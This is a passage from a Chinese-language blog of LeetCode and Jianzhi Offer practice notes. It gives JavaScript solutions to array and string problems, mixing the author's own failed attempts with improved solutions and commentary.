&#125;</span><br><span class="line">    <span class="comment">// 2.单层逻辑 两个 if 就是剪枝</span></span><br><span class="line">    <span class="keyword">if</span> (left &lt; n) generate(left + <span class="number">1</span>, right, n, str + <span class="string">&#x27;(&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> (left &gt; right) generate(left, right+<span class="number">1</span>, n, str + <span class="string">&#x27;)&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  generate(<span class="number">0</span>, <span class="number">0</span>, n, <span class="string">&quot;&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> res;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>AC，递归实现。</p><h2 id="LeetCode169——多数元素（☆）"><a href="#LeetCode169——多数元素（☆）" class="headerlink" title="LeetCode169——多数元素（☆）"></a>LeetCode169——多数元素（☆）</h2><p><a href="https://leetcode-cn.com/problems/majority-element/">跳转地址</a></p><h3 id="自己的代码-22"><a href="#自己的代码-22" class="headerlink" title="自己的代码"></a>自己的代码</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> majorityElement = <span class="function"><span class="keyword">function</span>(<span class="params">nums</span>) </span>&#123;</span><br><span class="line"><span class="keyword">let</span> map = [];</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; nums.length; i++)&#123;</span><br><span class="line"><span class="keyword">if</span> (map[nums[i]]) &#123;</span><br><span class="line">map[nums[i]]++;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">map[nums[i]] = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> c <span class="keyword">in</span> map) &#123;</span><br><span class="line"><span class="keyword">if</span> (map[c] &gt; nums.length / <span class="number">2</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> map[c];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>AC，但是很臃肿</p><h3 id="思路1-amp-题解-9"><a href="#思路1-amp-题解-9" class="headerlink" title="思路1&amp;题解"></a>思路1&amp;题解</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> majorityElement = <span class="function"><span class="keyword">function</span>(<span class="params">nums</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> obj = &#123;&#125;;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; nums.length; i++)&#123;</span><br><span class="line">        <span class="comment">// 学习！</span></span><br><span class="line">        obj[nums[i]] = obj[nums[i]] + <span class="number">1</span> || <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span>(obj[nums[i]] &gt; nums.length / <span class="number">2</span>)  <span class="keyword">return</span> nums[i];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>完全可以简化如上所示。</p><h3 id="思路2-amp-题解-10"><a href="#思路2-amp-题解-10" class="headerlink" title="思路2&amp;题解"></a>思路2&amp;题解</h3><p>排序。因为大于一半, 所以排序后的中间那个数即是。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> majorityElement = <span class="function"><span class="keyword">function</span>(<span class="params">nums</span>) </span>&#123;</span><br><span class="line">  nums.sort(<span class="function">(<span class="params">a,b</span>) =&gt;</span> a - b)</span><br><span class="line">  <span class="keyword">return</span> nums[<span class="built_in">Math</span>.floor(nums.length / <span class="number">2</span>)]</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="剑指-Offer-42——连续子数组的最大和（☆）（★★）"><a href="#剑指-Offer-42——连续子数组的最大和（☆）（★★）" class="headerlink" title="剑指 Offer 42——连续子数组的最大和（☆）（★★）"></a>剑指 Offer 42——连续子数组的最大和（☆）（★★）</h2><p><a href="https://leetcode-cn.com/problems/lian-xu-zi-shu-zu-de-zui-da-he-lcof/">跳转地址</a></p><p>DP:</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> maxSubArray = <span class="function"><span class="keyword">function</span> (<span class="params">nums</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> dp = [nums[<span class="number">0</span>]];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">1</span>; i &lt; nums.length; i++) &#123;</span><br><span class="line">        dp[i] = nums[i];</span><br><span class="line">        <span class="keyword">if</span> (dp[i - <span class="number">1</span>] &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            dp[i] = dp[i - <span class="number">1</span>] + dp[i];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">Math</span>.max(...dp);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="剑指-Offer-03——数组中重复的数字（☆-（★）"><a href="#剑指-Offer-03——数组中重复的数字（☆-（★）" class="headerlink" title="剑指 Offer 03——数组中重复的数字（☆)（★）"></a>剑指 Offer 03——数组中重复的数字（☆)（★）</h2><p><a href="https://leetcode-cn.com/problems/shu-zu-zhong-zhong-fu-de-shu-zi-lcof/">跳转地址</a></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> findRepeatNumber = <span class="function"><span class="keyword">function</span>(<span class="params">nums</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> map = <span class="keyword">new</span> <span class="built_in">Map</span>()</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; nums.length; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span> (!map.get(nums[i])) &#123;</span><br><span class="line">            map.set(nums[i],<span class="number">1</span>)</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> nums[i]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// or</span></span><br><span class="line"><span class="keyword">var</span> findRepeatNumber = <span class="function"><span class="keyword">function</span>(<span class="params">nums</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> s = <span class="keyword">new</span> <span class="built_in">Set</span>()</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">const</span> num <span class="keyword">of</span> nums)&#123;</span><br><span class="line">        <span class="keyword">if</span>(s.has(num))</span><br><span class="line">            <span class="keyword">return</span> num</span><br><span class="line">        s.add(num)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>AC</p><h2 id="LeetCode493——翻转对（☆☆☆）"><a href="#LeetCode493——翻转对（☆☆☆）" class="headerlink" title="LeetCode493——翻转对（☆☆☆）"></a>LeetCode493——翻转对（☆☆☆）</h2><p><a href="https://leetcode-cn.com/problems/reverse-pairs/">跳转地址</a></p><h3 id="自己的代码-23"><a href="#自己的代码-23" class="headerlink" title="自己的代码"></a>自己的代码</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> reversePairs = <span class="function"><span class="keyword">function</span>(<span class="params">nums</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> count = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; nums.length; i++)&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> j = i+<span class="number">1</span>; j &lt; nums.length; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (nums[i] &gt; <span class="number">2</span> * nums[j]) &#123;</span><br><span class="line">                count++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> count;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>毫无疑问超时了。</p><h3 id="思路-amp-题解-12"><a href="#思路-amp-题解-12" class="headerlink" title="思路&amp;题解"></a>思路&amp;题解</h3><p><strong>合并排序：</strong>但是用到 shift，导致数组很大时过不了测试，<a href="http://stlighter.github.io/2016/06/08/%E5%85%B3%E4%BA%8EJavaScript%E4%B8%80%E4%BA%9B%E6%80%A7%E8%83%BD%E4%B8%8A%E7%9A%84%E7%96%91%E6%83%91/">具体原因</a>。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> reversePairs = <span class="function"><span class="keyword">function</span>(<span class="params">nums</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> numReversePairs = <span class="number">0</span>; </span><br><span class="line">    mergeSort(nums);</span><br><span class="line">    <span class="keyword">return</span> numReversePairs;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">mergeSort</span>(<span class="params">nums</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">let</span> len = nums.length;</span><br><span class="line">        <span class="keyword">if</span>(len &lt; <span class="number">2</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> nums;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">let</span> middle = <span class="built_in">Math</span>.floor(len / <span class="number">2</span>),</span><br><span class="line">            left = nums.slice(<span class="number">0</span>, middle),</span><br><span class="line">            right = nums.slice(middle);</span><br><span class="line">        <span class="keyword">return</span> merge(mergeSort(left), mergeSort(right));</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">merge</span>(<span class="params">left, right</span>) </span>&#123;</span><br><span class="line">      <span class="keyword">let</span> result = [];</span><br><span class="line">      <span class="keyword">let</span> leftIndex = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">let</span> rightIndex = <span class="number">0</span>;  </span><br><span class="line">      <span class="keyword">while</span>(leftIndex &lt; left.length &amp;&amp; rightIndex &lt; right.length) &#123;</span><br><span class="line">          <span class="keyword">if</span> (left[leftIndex] &gt; <span class="number">2</span> * right[rightIndex]) &#123;</span><br><span class="line">          <span class="comment">// 因为 left 此时已经升序，所以(left.length - leftIndex)里的所有数都比 right[rightIndex] 大。</span></span><br><span class="line">          numReversePairs += (left.length - leftIndex);</span><br><span class="line">          rightIndex++;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          leftIndex++;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;    </span><br><span class="line">      <span class="keyword">while</span> (left.length &gt; <span class="number">0</span> &amp;&amp; right.length &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (left[<span class="number">0</span>] &lt; right[<span class="number">0</span>]) &#123;</span><br><span class="line">          result.push(left.shift());</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          result.push(right.shift());</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">while</span> (left.length) &#123;</span><br><span class="line">        result.push(left.shift());</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">while</span> (right.length) &#123;</span><br><span class="line">        result.push(right.shift());</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>因此在合并时，可以用下面代码代替：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">leftIndex = <span class="number">0</span>;</span><br><span class="line">   rightIndex = <span class="number">0</span>;</span><br><span class="line">   <span class="keyword">while</span> (leftIndex &lt; left.length &amp;&amp; rightIndex &lt; right.length) &#123;</span><br><span class="line">     <span class="keyword">if</span> (left[leftIndex] &lt; right[rightIndex]) &#123;</span><br><span class="line">       nums_sorted.push(left[leftIndex++]);</span><br><span class="line">     &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">       nums_sorted.push(right[rightIndex++]);</span><br><span class="line">     &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h2 id="LeetCode718——最长重复子数组（★）"><a href="#LeetCode718——最长重复子数组（★）" class="headerlink" title="LeetCode718——最长重复子数组（★）"></a>LeetCode718——最长重复子数组（★）</h2><p><a href="https://leetcode-cn.com/problems/maximum-length-of-repeated-subarray/">跳转地址</a></p><h3 id="思路1-amp-题解-10"><a href="#思路1-amp-题解-10" class="headerlink" title="思路1&amp;题解"></a>思路1&amp;题解</h3><p>暴力：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> findLength = <span class="function">(<span class="params">A, B</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> m = A.length;</span><br><span class="line">  <span class="keyword">const</span> n = B.length;</span><br><span class="line">  <span class="keyword">let</span> res = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; m; i++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> j = <span class="number">0</span>; j &lt; n; j++) &#123;</span><br><span class="line">      <span class="keyword">if</span> (A[i] == B[j]) &#123; </span><br><span class="line">        <span class="keyword">let</span> subLen = <span class="number">1</span>;   </span><br><span class="line">        <span class="comment">//新的一项也相同</span></span><br><span class="line">        <span class="keyword">while</span> (i + subLen &lt; m &amp;&amp; j + subLen &lt; n &amp;&amp; A[i + subLen] == B[j + subLen]) &#123; </span><br><span class="line">          subLen++; </span><br><span class="line">        &#125;</span><br><span class="line">        res = <span class="built_in">Math</span>.max(subLen, res);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> res;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>超时</p><h3 id="思路2-amp-题解-11"><a href="#思路2-amp-题解-11" class="headerlink" title="思路2&amp;题解"></a>思路2&amp;题解</h3><p>DP：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> findLength = <span class="function"><span class="keyword">function</span> (<span class="params">nums1, nums2</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> m = nums1.length;</span><br><span class="line">    <span class="keyword">let</span> n = nums2.length;</span><br><span class="line">    <span class="keyword">let</span> res = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">let</span> dp = <span class="keyword">new</span> <span class="built_in">Array</span>(m + <span class="number">1</span>).fill(<span class="keyword">new</span> <span class="built_in">Array</span>(n + <span class="number">1</span>).fill(<span class="number">0</span>));</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">1</span>; i &lt;= m; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> j = <span class="number">1</span>; j &lt;= n; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (nums1[i - <span class="number">1</span>] === nums2[j - <span class="number">1</span>]) &#123;</span><br><span class="line">                dp[i][j] = dp[i - <span class="number">1</span>][j - <span class="number">1</span>] + <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            res = <span class="built_in">Math</span>.max(res, dp[i][j]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="剑指-Offer-II-060——出现频率最高的-k-个数字（☆☆）（★todo）"><a href="#剑指-Offer-II-060——出现频率最高的-k-个数字（☆☆）（★todo）" class="headerlink" title="剑指 Offer II 060——出现频率最高的 k 个数字（☆☆）（★todo）"></a>剑指 Offer II 060——出现频率最高的 k 个数字（☆☆）（★todo）</h2><p><a href="https://leetcode-cn.com/problems/g5c51o/">跳转地址</a></p><h1 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h1><h2 id="LeetCode14——最长公共前缀（☆）（★）"><a href="#LeetCode14——最长公共前缀（☆）（★）" class="headerlink" title="LeetCode14——最长公共前缀（☆）（★）"></a>LeetCode14——最长公共前缀（☆）（★）</h2><p><a href="https://leetcode-cn.com/problems/longest-common-prefix/">跳转地址</a></p><h3 id="自己的代码-24"><a href="#自己的代码-24" class="headerlink" title="自己的代码"></a>自己的代码</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> str1 = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">var</span> n = strs.length;</span><br><span class="line"><span class="keyword">var</span> count </span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt;strs[<span class="number">0</span>].length; i++)&#123;</span><br><span class="line">  count = <span class="number">0</span>;</span><br><span class="line">  a = strs[<span class="number">0</span>][i];</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> j = <span class="number">1</span>; j &lt; n; j++)&#123;</span><br><span class="line">    <span class="keyword">if</span> (strs[j].indexOf(a) == i) &#123;</span><br><span class="line">      count++</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (count==n-<span class="number">1</span>) &#123;</span><br><span class="line">    str1 = str1 + a</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (str1 == <span class="string">&quot;undefined&quot;</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> str1</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>真的又臭又长啊。还过不了，硬罗列总会有考虑不到的地方。为什么做题老是想不到用一些<strong>js内置方法</strong>解决呢。（比如这题的substr）</p><p>easy题卡了半个多小时哇。。</p><h3 id="思路1-amp-题解-11"><a href="#思路1-amp-题解-11" class="headerlink" title="思路1&amp;题解"></a>思路1&amp;题解</h3><p>暴力求解：先对数组排序，看最小长度的字符串有没有在其他两个中，没有的话就减少一位。但是复杂度很高。</p><h3 id="思路2-amp-题解-12"><a href="#思路2-amp-题解-12" class="headerlink" title="思路2&amp;题解"></a>思路2&amp;题解</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> longestCommonPrefix = <span class="function"><span class="keyword">function</span>(<span class="params">strs</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (strs === <span class="literal">null</span> || strs.leng === <span class="number">0</span>) <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; strs[<span class="number">0</span>].length; i++)&#123;</span><br><span class="line">        <span class="keyword">let</span> c = strs[<span class="number">0</span>].charAt(i);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> j = <span class="number">1</span>; j &lt; strs.length; j++)&#123;</span><br><span class="line">            <span class="keyword">if</span> (strs[j].charAt(i) !== c) &#123;</span><br><span class="line">                <span class="keyword">return</span> strs[<span class="number">0</span>].substr(<span class="number">0</span>, i);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 或者直接 for of</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">let</span> s <span class="keyword">of</span> strs) &#123;</span><br><span class="line">            <span class="keyword">if</span>(s[i] !== strs[<span class="number">0</span>][i]) <span class="keyword">return</span> s.slice(<span class="number">0</span>, i);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> strs[<span class="number">0</span>];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>直接用字符串下标的方法按位比较啊！为啥要把字符串的第x位取出来然后和下一个的第x位比较呢？</p><p>还有，可以先两两比较，再在下一个循环中两两比较，不用一次性对循环中的所有字符串判断啊。</p><p>时间复杂度：O(n)，n 为所有字符串的长度之和</p><h2 id="LeetCode5——最长回文子串（☆☆）（to-redo）"><a href="#LeetCode5——最长回文子串（☆☆）（to-redo）" class="headerlink" title="LeetCode5——最长回文子串（☆☆）（to redo）"></a>LeetCode5——最长回文子串（☆☆）（to redo）</h2><p><a href="https://leetcode-cn.com/problems/longest-palindromic-substring/">跳转地址</a></p><h3 id="自己的代码-25"><a href="#自己的代码-25" class="headerlink" title="自己的代码"></a>自己的代码</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> longestPalindrome = <span class="function"><span class="keyword">function</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> count = <span class="number">0</span>, res = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; s.length; j++)&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> j = s.length-<span class="number">1</span>; j &gt; i; j--)&#123;</span><br><span class="line">            <span class="keyword">let</span> newStr = s.slice(i, j);</span><br><span class="line">            <span class="keyword">if</span> (newStr.split(<span class="string">&quot;&quot;</span>).reverse().join(<span class="string">&quot;&quot;</span>) === newStr &amp;&amp; count &lt; j - i) &#123;</span><br><span class="line">                count = j - i;</span><br><span class="line">                res = newStr;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>未AC，超时</p><h3 id="思路-amp-题解-13"><a href="#思路-amp-题解-13" class="headerlink" title="思路&amp;题解"></a>思路&amp;题解</h3><p>好像是道动态规划的题目，看了一些题解看不懂哇。。<a href="https://leetcode-cn.com/problems/longest-palindromic-substring/solution/chao-jian-dan-de-zhong-xin-kuo-san-fa-yi-qini/">https://leetcode-cn.com/problems/longest-palindromic-substring/solution/chao-jian-dan-de-zhong-xin-kuo-san-fa-yi-qini/</a> 占个坑以后再看。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> longestPalindrome = <span class="function"><span class="keyword">function</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (s.length&lt;<span class="number">2</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> s</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">let</span> res = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; s.length; i++) &#123;</span><br><span class="line">            <span class="comment">// 回文子串长度是奇数</span></span><br><span class="line">            helper(i, i)</span><br><span class="line">            <span class="comment">// 回文子串长度是偶数</span></span><br><span class="line">            helper(i, i + <span class="number">1</span>) </span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">helper</span>(<span class="params">m, n</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">while</span> (m &gt;= <span class="number">0</span> &amp;&amp; n &lt; s.length &amp;&amp; s[m] == s[n]) &#123;</span><br><span class="line">                m--</span><br><span class="line">                n++</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 注意此处m,n的值循环完后  是恰好不满足循环条件的时刻</span></span><br><span class="line">            <span class="comment">// 此时m到n的距离为n-m+1，但是mn两个边界不能取 所以应该取m+1到n-1的区间  长度是n-m-1</span></span><br><span class="line">            <span class="keyword">if</span> (n - m - <span class="number">1</span> &gt; res.length) &#123;</span><br><span class="line">                <span class="comment">// slice也要取[m+1,n-1]这个区间 </span></span><br><span class="line">                res = s.slice(m + <span class="number">1</span>, n)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> longestPalindrome = <span class="function"><span class="keyword">function</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line"><span class="keyword">if</span>(s.length &lt;= <span class="number">1</span>) <span class="keyword">return</span> s;</span><br><span class="line">    <span class="keyword">const</span> dp = [...new <span class="built_in">Array</span>(s.length + <span class="number">1</span>)].map(<span class="function"><span class="params">_</span> =&gt;</span> <span class="keyword">new</span> <span class="built_in">Array</span>(s.length + <span class="number">1</span>).fill(<span class="literal">false</span>));</span><br><span class="line">    <span class="keyword">let</span> lps = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; s.length; i++) &#123;</span><br><span class="line">        dp[i][i] = <span class="literal">true</span>;</span><br><span class="line">        lps = s[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; s.length; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span>(s[i] === s[i + <span class="number">1</span>]) dp[i][i+<span class="number">1</span>] = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">if</span>(dp[i][i+<span class="number">1</span>]) lps = s.substring(i, i + <span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> i = s.length - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">let</span> j = i + <span class="number">2</span>; j &lt; s.length; j++) &#123;</span><br><span class="line">            dp[i][j] = dp[i+<span class="number">1</span>][j-<span class="number">1</span>] &amp;&amp; s[i] === s[j];</span><br><span class="line">            <span class="keyword">if</span>(dp[i][j]) lps = lps.length &lt; (j - i + <span class="number">1</span>) ? s.substring(i, j + <span class="number">1</span>) : lps;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> lps;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="LeetCode151——翻转字符串里的单词（☆☆）（★★）"><a href="#LeetCode151——翻转字符串里的单词（☆☆）（★★）" class="headerlink" title="LeetCode151——翻转字符串里的单词（☆☆）（★★）"></a>LeetCode151——翻转字符串里的单词（☆☆）（★★）</h2><p><a href="https://leetcode-cn.com/problems/reverse-words-in-a-string/">跳转地址</a></p><h3 id="自己的代码-26"><a href="#自己的代码-26" class="headerlink" title="自己的代码"></a>自己的代码</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> reverseWords = <span class="function"><span class="keyword">function</span> (<span class="params">s</span>) </span>&#123;</span><br><span class="line">  s=s.trim()</span><br><span class="line">  <span class="keyword">var</span> a = <span class="keyword">new</span> <span class="built_in">Array</span>()</span><br><span class="line">  <span class="keyword">var</span> arr=<span class="keyword">new</span> <span class="built_in">Array</span>()</span><br><span class="line">  <span class="keyword">var</span> count=<span class="number">0</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; s.length; i++)&#123;</span><br><span class="line">    <span class="keyword">if</span> (s[i] != <span class="string">&#x27; &#x27;</span> ) &#123;</span><br><span class="line">      a.push(s[i])</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (s[i + <span class="number">1</span>] != <span class="string">&#x27; &#x27;</span>) &#123;</span><br><span class="line">      arr[count++]=a.join(<span class="string">&quot;&quot;</span>)</span><br><span class="line">      a=[]</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  arr[count]=a.join(<span class="string">&quot;&quot;</span>)</span><br><span class="line">  <span class="keyword">return</span> arr.reverse().join(<span class="string">&quot; &quot;</span>)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>如果真让自己想，肯定做不出来，因为过程中找了怎么将数组连接字符串，怎么往数组中添加字符等等。甚至还尝试了二维数组，只能说掌握太不好了。</p><h3 id="思路1-amp-题解-12"><a href="#思路1-amp-题解-12" class="headerlink" title="思路1&amp;题解"></a>思路1&amp;题解</h3><ol><li>使用 <code>split</code> 将字符串按空格分割成字符串数组；</li><li>使用 <code>reverse</code> 将字符串数组进行反转；</li><li>使用 <code>join</code> 方法将字符串数组拼成一个字符串。</li></ol><p><img src="https://i.loli.net/2021/06/14/ZiC1kM2E9msTIKF.jpg" alt="Snipaste_2021-06-14_15-14-36.jpg"></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//正则</span></span><br><span class="line"><span class="keyword">var</span> reverseWords = <span class="function"><span class="keyword">function</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> s.trim().split(<span class="regexp">/\s+/</span>).reverse().join(<span class="string">&#x27; &#x27;</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//过滤器</span></span><br><span class="line"><span class="keyword">var</span> reverseWords = <span class="function"><span class="keyword">function</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 也可以用 filter(Boolean)</span></span><br><span class="line">    <span class="keyword">return</span> s.split(<span class="string">&quot; &quot;</span>).filter(<span class="function"><span class="params">v</span> =&gt;</span> v != <span class="string">&quot;&quot;</span>).reverse().join(<span class="string">&quot; &quot;</span>);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>？？？这就是 API 的魅力吗？</p><p>时间复杂度：O(N)，其中 N 为输入字符串的长度。</p><h3 id="思路2-amp-题解-13"><a href="#思路2-amp-题解-13" class="headerlink" title="思路2&amp;题解"></a>思路2&amp;题解</h3><p><strong>双端队列（不使用 API）</strong>（两端都可以进队的队列）</p><ul><li>首先去除字符串左右空格</li><li>逐个读取字符串中的每个单词，依次放入双端队列的对头</li><li>再将队列转换成字符串输出（已空格为分隔符）</li></ul><p><img 